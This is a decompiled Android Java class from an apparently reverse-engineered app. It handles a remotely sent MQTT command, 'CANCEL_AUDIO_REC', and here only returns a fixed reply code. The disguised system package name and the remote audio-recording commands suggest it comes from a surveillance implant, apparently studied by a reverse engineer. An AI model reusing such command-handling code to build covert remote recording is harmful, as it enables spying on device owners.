package com.app.system.common.commands;

import android.content.Context;
import com.app.system.mqtt.MqttCommand;
import com.app.system.mqtt.MqttCommandReply;
import java.text.SimpleDateFormat;
import java.util.Date;

public class CancelAudioRec
  extends Command
{
  public static final String CMD_NAME = "CANCEL_AUDIO_REC";
  private static final SimpleDateFormat DF = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
  public static final String PARAM_START_TIME = "DATA_ORA";
  public static Command.Factory sFactory = new Command.Factory()
  {
    public Command a(MqttCommand paramAnonymousMqttCommand)
    {
      return new CancelAudioRec(paramAnonymousMqttCommand, null);
    }
  };
  private String errorText;
  private Date startTime;
  
  private CancelAudioRec(MqttCommand paramMqttCommand)
  {
    super(paramMqttCommand);
  }
  
  public MqttCommandReply a(Context paramContext)
  {
    paramContext = this.mqttCmd.b(paramContext);
    paramContext.result = 320;
    paramContext.replyText = MqttCommandReply.a(320);
    return paramContext;
  }
}


/* Location:              ~/com/app/system/common/commands/CancelAudioRec.class
 *
 * Reversed by:           J
 */